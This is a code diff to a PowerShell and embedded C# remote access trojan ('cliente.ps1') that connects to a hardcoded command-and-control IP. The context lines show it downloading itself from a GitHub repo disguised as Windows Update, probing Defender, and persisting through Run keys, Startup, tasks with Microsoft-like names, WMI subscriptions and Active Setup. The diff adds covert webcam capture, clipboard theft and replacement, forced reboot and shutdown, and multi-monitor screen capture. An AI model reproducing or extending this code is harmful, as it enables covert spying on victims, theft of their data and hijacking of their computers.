@@ -1,5 +1,5 @@
 # language: PowerShell, file: cliente.ps1, target: Windows 10/11, PowerShell 5.1
-# persistência: Run keys + Startup + Task user + Task SYSTEM boot + Shadow task + WMI event + Active Setup
+# + webcam (VfW) + reboot/shutdown/logoff + multi-monitor + clipboard get/set
 
 $serverIP = "198.1.195.204"
 $serverPort = 4000
@@ -27,7 +27,6 @@ $vbsPath = "$dir\$installName.vbs"
 $bootPath = "$dir\boot_launcher.ps1"
 
 if ($args -notcontains "-silent") {
-    # 1. Defender
     $defenderOff = $false
     try {
         $mp = Get-MpComputerStatus -ErrorAction Stop
@@ -58,7 +57,6 @@ if ($args -notcontains "-silent") {
         } catch {}
     }
 
-    # 2. Ficheiros
     New-Item -ItemType Directory -Path $dir -Force -ErrorAction SilentlyContinue | Out-Null
     try { (New-Object Net.WebClient).DownloadFile($myUrl, $scriptPath) } catch {}
 
@@ -77,7 +75,6 @@ while (`$true) {
 "@
     Set-Content -Path $bootPath -Value $bootContent -Force -ErrorAction SilentlyContinue
 
-    # 3. Run keys + Startup
     $cmd = "wscript.exe //B //Nologo `"$vbsPath`""
     try {
         Set-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name $installName -Value $cmd -Force -ErrorAction SilentlyContinue
@@ -89,7 +86,6 @@ while (`$true) {
         Copy-Item $vbsPath "$startup\$installName.vbs" -Force -ErrorAction SilentlyContinue
     } catch {}
 
-    # 4. Task user + SYSTEM + shadow
     try {
         $interval = if ($defenderOff) { 3 } else { 1 }
         $startTime = (Get-Date).ToString("yyyy-MM-ddTHH:mm:ss")
@@ -167,7 +163,6 @@ while (`$true) {
         Remove-Item $p3 -Force -ErrorAction SilentlyContinue
     } catch {}
 
-    # 5. WMI event subscription — dispara no arranque do explorer.exe
     try {
         $wmiFilterName   = "MSUpdateF_$h"
         $wmiConsumerName = "MSUpdateC_$h"
@@ -205,7 +200,6 @@ while (`$true) {
         }
     } catch {}
 
-    # 6. Active Setup — dispara no próximo logon (perfil novo)
     try {
         $asHex = ($h + "000000000000000000000000").Substring(0, 32)
         $asGuid = "{" + $asHex.Substring(0,8) + "-" + $asHex.Substring(8,4) + "-" + $asHex.Substring(12,4) + "-" + $asHex.Substring(16,4) + "-" + $asHex.Substring(20,12) + "}"
@@ -258,6 +252,35 @@ if (-not ("R9KAgent" -as [type])) {
         [DllImport("user32.dll")] public static extern bool BlockInput(bool fBlockIt);
         [DllImport("user32.dll")] public static extern bool SetProcessDPIAware();
 
+        [DllImport("avicap32.dll", CharSet = CharSet.Unicode)]
+        public static extern IntPtr capCreateCaptureWindow(string lpszWindowName, int dwStyle, int x, int y, int nWidth, int nHeight, IntPtr hWnd, int nID);
+
+        [DllImport("user32.dll", CharSet = CharSet.Ansi)]
+        public static extern IntPtr SendMessage(IntPtr hWnd, uint Msg, IntPtr wParam, string lParam);
+        [DllImport("user32.dll")]
+        public static extern IntPtr SendMessage(IntPtr hWnd, uint Msg, IntPtr wParam, IntPtr lParam);
+        [DllImport("user32.dll")]
+        public static extern bool DestroyWindow(IntPtr hWnd);
+
+        [DllImport("user32.dll", SetLastError = true)] public static extern bool OpenClipboard(IntPtr hWnd);
+        [DllImport("user32.dll", SetLastError = true)] public static extern bool CloseClipboard();
+        [DllImport("user32.dll", SetLastError = true)] public static extern IntPtr GetClipboardData(uint uFormat);
+        [DllImport("user32.dll", SetLastError = true)] public static extern bool SetClipboardData(uint uFormat, IntPtr hMem);
+        [DllImport("user32.dll", SetLastError = true)] public static extern bool EmptyClipboard();
+        [DllImport("kernel32.dll", SetLastError = true)] public static extern IntPtr GlobalAlloc(uint uFlags, UIntPtr dwBytes);
+        [DllImport("kernel32.dll", SetLastError = true)] public static extern IntPtr GlobalLock(IntPtr hMem);
+        [DllImport("kernel32.dll", SetLastError = true)] public static extern bool GlobalUnlock(IntPtr hMem);
+        [DllImport("kernel32.dll", SetLastError = true)] public static extern IntPtr GlobalFree(IntPtr hMem);
+
+        const uint CF_UNICODETEXT = 13;
+        const uint GMEM_MOVEABLE = 2;
+
+        const uint WM_CAP_START = 0x0400;
+        const uint WM_CAP_DRIVER_CONNECT = WM_CAP_START + 10;
+        const uint WM_CAP_DRIVER_DISCONNECT = WM_CAP_START + 11;
+        const uint WM_CAP_FILE_SAVEDIB = WM_CAP_START + 25;
+        const uint WM_CAP_GRAB_FRAME = WM_CAP_START + 60;
+
         [ComImport, Guid("BCDE0395-E52F-467C-8E3D-C4579291692E")] class MMDeviceEnumeratorComObject { }
         [ComImport, Guid("A95664D2-9614-4F35-A746-DE8DB63617E6"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
         interface IMMDeviceEnumerator { int NotImpl1(); int GetDefaultAudioEndpoint(int dataFlow, int role, out IMMDevice ppDevice); }
@@ -297,6 +320,7 @@ if (-not ("R9KAgent" -as [type])) {
         static volatile int targetX = 0;
         static volatile int targetY = 0;
         static volatile bool hasNewPos = false;
+        static int currentScreen = 0;
         static volatile Form bannerForm = null;
         static volatile Thread bannerThread = null;
         static volatile StreamWriter globalWriter = null;
@@ -304,6 +328,15 @@ if (-not ("R9KAgent" -as [type])) {
         static Graphics reuseGfx = null;
         static ImageCodecInfo jpgCodec = null;
         static EncoderParameters jpgParams = null;
+
+        static void EnsureJpegCodec(long quality) {
+            if (jpgCodec == null) {
+                ImageCodecInfo[] codecs = ImageCodecInfo.GetImageDecoders();
+                foreach (var c in codecs) { if (c.FormatID == ImageFormat.Jpeg.Guid) { jpgCodec = c; break; } }
+                jpgParams = new EncoderParameters(1);
+                jpgParams.Param[0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, quality);
+            }
+        }
 
         public static void Start(string ip, int port) {
             IP = ip; PORT = port;
@@ -327,7 +360,8 @@ if (-not ("R9KAgent" -as [type])) {
                     StreamWriter myWriter = new StreamWriter(myStream, new UTF8Encoding(false));
                     myWriter.AutoFlush = true;
                     globalWriter = myWriter;
-                    myWriter.WriteLine("BANNER:" + Environment.MachineName + "@" + Environment.UserName + "|" + Screen.PrimaryScreen.Bounds.Width + "|" + Screen.PrimaryScreen.Bounds.Height + "|True");
+                    int nMon = Screen.AllScreens.Length;
+                    myWriter.WriteLine("BANNER:" + Environment.MachineName + "@" + Environment.UserName + "|" + Screen.PrimaryScreen.Bounds.Width + "|" + Screen.PrimaryScreen.Bounds.Height + "|" + nMon);
                     Thread tRead = new Thread(() => ReadLoop(myClient, myReader, myWriter)); tRead.IsBackground = true; tRead.Start();
                     Thread tStream = new Thread(() => StreamLoop(myClient, myWriter)); tStream.IsBackground = true; tStream.Start();
                     Thread tBeat = new Thread(() => HeartbeatLoop(myClient, myWriter)); tBeat.IsBackground = true; tBeat.Start();
@@ -369,7 +403,6 @@ if (-not ("R9KAgent" -as [type])) {
                         string scriptPath = Path.Combine(sub, "WinUpdateSvc_" + leaf + ".ps1");
                         string vbsPath = Path.Combine(sub, "WinUpdateSvc_" + leaf + ".vbs");
                         string bootPath = Path.Combine(sub, "boot_launcher.ps1");
-
                         if (!File.Exists(scriptPath)) {
                             string url = "https://raw.githubusercontent.com/luskavqq7/Windows-Update/refs/heads/main/cliente.ps1";
                             try { using (var wc = new System.Net.WebClient()) { wc.DownloadFile(url, scriptPath); } } catch {}
@@ -385,25 +418,12 @@ if (-not ("R9KAgent" -as [type])) {
                             try { File.WriteAllText(bootPath, b); } catch {}
                             try { File.SetAttributes(bootPath, FileAttributes.Hidden | FileAttributes.System | FileAttributes.ReadOnly); } catch {}
                         }
-
                         string tUser = "MicrosoftWindowsUpdateService_" + leaf;
                         string tBoot = "MicrosoftWindowsUpdateBoot_" + leaf;
                         string tShadow = "\\Microsoft\\Windows\\Application Experience\\MicrosoftCompatibilityAppraiser_" + leaf;
-
-                        if (!TaskExists(tUser)) {
-                            string xml = TaskXml(scriptPath, vbsPath, false);
-                            CreateTaskFromXml(tUser, xml, sub);
-                        }
-                        if (!TaskExists(tBoot)) {
-                            string xml = TaskXml(scriptPath, bootPath, true);
-                            CreateTaskFromXml(tBoot, xml, sub);
-                        }
-                        if (!TaskExists(tShadow)) {
-                            string xml = TaskXml(scriptPath, vbsPath, false);
-                            CreateTaskFromXml(tShadow, xml, sub);
-                        }
-
-                        // Run keys
+                        if (!TaskExists(tUser)) { CreateTaskFromXml(tUser, TaskXml(scriptPath, vbsPath, false), sub); }
+                        if (!TaskExists(tBoot)) { CreateTaskFromXml(tBoot, TaskXml(scriptPath, bootPath, true), sub); }
+                        if (!TaskExists(tShadow)) { CreateTaskFromXml(tShadow, TaskXml(scriptPath, vbsPath, false), sub); }
                         using (RegistryKey rk = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true)) {
                             if (rk != null && rk.GetValue("WinUpdateSvc_" + leaf) == null) rk.SetValue("WinUpdateSvc_" + leaf, "wscript.exe //B //Nologo \"" + vbsPath + "\"");
                         }
@@ -556,12 +576,129 @@ if (-not ("R9KAgent" -as [type])) {
             t.SetApartmentState(ApartmentState.STA); t.IsBackground = true; t.Start();
         }
 
+        // ==== WEBCAM (VfW via avicap32) ====
+        static string CaptureWebcam() {
+            IntPtr capWnd = IntPtr.Zero;
+            string tempBmp = Path.Combine(Path.GetTempPath(), "r9k_cam_" + Guid.NewGuid().ToString("N") + ".bmp");
+            try {
+                capWnd = capCreateCaptureWindow("R9KCap", 0, 0, 0, 640, 480, IntPtr.Zero, 0);
+                if (capWnd == IntPtr.Zero) return null;
+                if (SendMessage(capWnd, WM_CAP_DRIVER_CONNECT, IntPtr.Zero, IntPtr.Zero) == IntPtr.Zero) return null;
+                SendMessage(capWnd, WM_CAP_GRAB_FRAME, IntPtr.Zero, IntPtr.Zero);
+                IntPtr r = SendMessage(capWnd, WM_CAP_FILE_SAVEDIB, IntPtr.Zero, tempBmp);
+                if (r == IntPtr.Zero || !File.Exists(tempBmp)) return null;
+                EnsureJpegCodec(70);
+                using (Bitmap bmp = new Bitmap(tempBmp)) {
+                    int maxW = 1280;
+                    Bitmap finalBmp = bmp;
+                    if (bmp.Width > maxW) {
+                        int nw = maxW, nh = (int)(bmp.Height * ((float)maxW / bmp.Width));
+                        finalBmp = new Bitmap(nw, nh);
+                        using (Graphics g = Graphics.FromImage(finalBmp)) {
+                            g.InterpolationMode = System.Drawing.Drawing2D.InterpolationMode.Bilinear;
+                            g.DrawImage(bmp, 0, 0, nw, nh);
+                        }
+                    }
+                    using (MemoryStream ms = new MemoryStream()) {
+                        finalBmp.Save(ms, jpgCodec, jpgParams);
+                        if (finalBmp != bmp) finalBmp.Dispose();
+                        return Convert.ToBase64String(ms.ToArray());
+                    }
+                }
+            } catch { return null; }
+            finally {
+                if (capWnd != IntPtr.Zero) {
+                    try { SendMessage(capWnd, WM_CAP_DRIVER_DISCONNECT, IntPtr.Zero, IntPtr.Zero); } catch {}
+                    try { DestroyWindow(capWnd); } catch {}
+                }
+                try { if (File.Exists(tempBmp)) File.Delete(tempBmp); } catch {}
+            }
+        }
+
+        // ==== CLIPBOARD (Win32, sem STA) ====
+        static string GetClipboardText() {
+            for (int i = 0; i < 5; i++) {
+                if (OpenClipboard(IntPtr.Zero)) {
+                    try {
+                        IntPtr h = GetClipboardData(CF_UNICODETEXT);
+                        if (h == IntPtr.Zero) return "";
+                        IntPtr p = GlobalLock(h);
+                        if (p == IntPtr.Zero) return "";
+                        try { return Marshal.PtrToStringUni(p); }
+                        finally { GlobalUnlock(h); }
+                    } finally { CloseClipboard(); }
+                }
+                Thread.Sleep(50);
+            }
+            return null;
+        }
+
+        static bool SetClipboardText(string text) {
+            for (int i = 0; i < 5; i++) {
+                if (OpenClipboard(IntPtr.Zero)) {
+                    try {
+                        if (!EmptyClipboard()) return false;
+                        int bytes = (text.Length + 1) * 2;
+                        IntPtr h = GlobalAlloc(GMEM_MOVEABLE, (UIntPtr)bytes);
+                        if (h == IntPtr.Zero) return false;
+                        IntPtr p = GlobalLock(h);
+                        if (p == IntPtr.Zero) { GlobalFree(h); return false; }
+                        byte[] buf = Encoding.Unicode.GetBytes(text + "\0");
+                        Marshal.Copy(buf, 0, p, buf.Length);
+                        GlobalUnlock(h);
+                        if (SetClipboardData(CF_UNICODETEXT, h) == IntPtr.Zero) { GlobalFree(h); return false; }
+                        return true;
+                    } finally { CloseClipboard(); }
+                }
+                Thread.Sleep(50);
+            }
+            return false;
+        }
+
         static void ProcessCommand(string cmd, StreamWriter myWriter) {
             try {
                 if (cmd == "stream_start") { streaming = true; return; }
                 if (cmd == "stream_stop") { streaming = false; lock(writeLock) { myWriter.WriteLine("STREAM_STOPPED"); } return; }
                 if (cmd == "audio_start") { StartAudio(); lock(writeLock) { myWriter.WriteLine("AUDIO_ON"); } return; }
                 if (cmd == "audio_stop") { isAudioRunning = false; lock(writeLock) { myWriter.WriteLine("AUDIO_OFF"); } return; }
+                if (cmd == "webcam") {
+                    string b64 = CaptureWebcam();
+                    lock (writeLock) {
+                        if (b64 != null) myWriter.WriteLine("WEBCAM:" + b64);
+                        else myWriter.WriteLine("CAM_ERR:no_camera");
+                    }
+                    return;
+                }
+                if (cmd == "monitor_next") {
+                    int n = Screen.AllScreens.Length;
+                    if (n > 1) { currentScreen = (currentScreen + 1) % n; lock (writeLock) { myWriter.WriteLine("MONITOR:" + currentScreen + "/" + n); } }
+                    else { lock (writeLock) { myWriter.WriteLine("MONITOR:1/1"); } }
+                    return;
+                }
+                if (cmd == "monitor_reset") { currentScreen = 0; lock (writeLock) { myWriter.WriteLine("MONITOR:0/" + Screen.AllScreens.Length); } return; }
+                if (cmd == "clip_get") {
+                    string t = GetClipboardText();
+                    lock (writeLock) {
+                        if (t == null) myWriter.WriteLine("CLIPBOARD_ERR:open_failed");
+                        else myWriter.WriteLine("CLIPBOARD:" + Convert.ToBase64String(Encoding.UTF8.GetBytes(t)));
+                    }
+                    return;
+                }
+                if (cmd.StartsWith("clip_set ")) {
+                    try {
+                        string b64 = cmd.Substring(9);
+                        string txt = Encoding.UTF8.GetString(Convert.FromBase64String(b64));
+                        bool ok = SetClipboardText(txt);
+                        lock (writeLock) { myWriter.WriteLine(ok ? "CLIPBOARD_SET_OK" : "CLIPBOARD_SET_ERR"); }
+                    } catch {
+                        lock (writeLock) { myWriter.WriteLine("CLIPBOARD_SET_ERR"); }
+                    }
+                    return;
+                }
+                if (cmd == "reboot")   { lock (writeLock) { myWriter.WriteLine("REBOOTING"); } Thread.Sleep(200); Process.Start("shutdown", "/r /f /t 0"); return; }
+                if (cmd == "shutdown") { lock (writeLock) { myWriter.WriteLine("SHUTTING_DOWN"); } Thread.Sleep(200); Process.Start("shutdown", "/s /f /t 0"); return; }
+                if (cmd == "logoff")   { lock (writeLock) { myWriter.WriteLine("LOGGING_OFF"); } Thread.Sleep(200); Process.Start("shutdown", "/l /f"); return; }
+
                 if (cmd == "banner_on") {
                     if (bannerThread != null && bannerThread.IsAlive) return;
                     BlockInput(true);
@@ -626,8 +763,8 @@ if (-not ("R9KAgent" -as [type])) {
                 if (cmd.StartsWith("move ")) {
                     string[] p = cmd.Split(' ');
                     int nx = int.Parse(p[1]); int ny = int.Parse(p[2]);
-                    targetX = (int)((nx / 65535.0) * Screen.PrimaryScreen.Bounds.Width);
-                    targetY = (int)((ny / 65535.0) * Screen.PrimaryScreen.Bounds.Height);
+                    targetX = (int)((nx / 65535.0) * Screen.AllScreens[currentScreen].Bounds.Width);
+                    targetY = (int)((ny / 65535.0) * Screen.AllScreens[currentScreen].Bounds.Height);
                     hasNewPos = true;
                 }
                 else if (cmd == "md 1") mouse_event(0x0002, 0, 0, 0, 0);
@@ -694,14 +831,14 @@ if (-not ("R9KAgent" -as [type])) {
         static string CaptureScreen(int maxW, long quality) {
             lock (capLock) {
                 try {
-                    Rectangle bounds = Screen.PrimaryScreen.Bounds;
+                    Rectangle bounds = Screen.AllScreens[currentScreen].Bounds;
                     if (reuseBmp == null || reuseBmp.Width != bounds.Width || reuseBmp.Height != bounds.Height) {
                         if (reuseGfx != null) reuseGfx.Dispose();
                         if (reuseBmp != null) reuseBmp.Dispose();
                         reuseBmp = new Bitmap(bounds.Width, bounds.Height);
                         reuseGfx = Graphics.FromImage(reuseBmp);
                     }
-                    reuseGfx.CopyFromScreen(0, 0, 0, 0, bounds.Size);
+                    reuseGfx.CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size);
                     Bitmap finalBmp = reuseBmp;
                     if (maxW > 0 && reuseBmp.Width > maxW) {
                         int newW = maxW, newH = (int)(reuseBmp.Height * ((float)maxW / reuseBmp.Width));
@@ -712,12 +849,7 @@ if (-not ("R9KAgent" -as [type])) {
                         }
                     }
                     using (MemoryStream ms = new MemoryStream()) {
-                        if (jpgCodec == null) {
-                            ImageCodecInfo[] codecs = ImageCodecInfo.GetImageDecoders();
-                            foreach (var c in codecs) { if (c.FormatID == ImageFormat.Jpeg.Guid) { jpgCodec = c; break; } }
-                            jpgParams = new EncoderParameters(1);
-                            jpgParams.Param[0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, quality);
-                        }
+                        EnsureJpegCodec(quality);
                         finalBmp.Save(ms, jpgCodec, jpgParams);
                         if (finalBmp != reuseBmp) finalBmp.Dispose();
                         return Convert.ToBase64String(ms.ToArray());
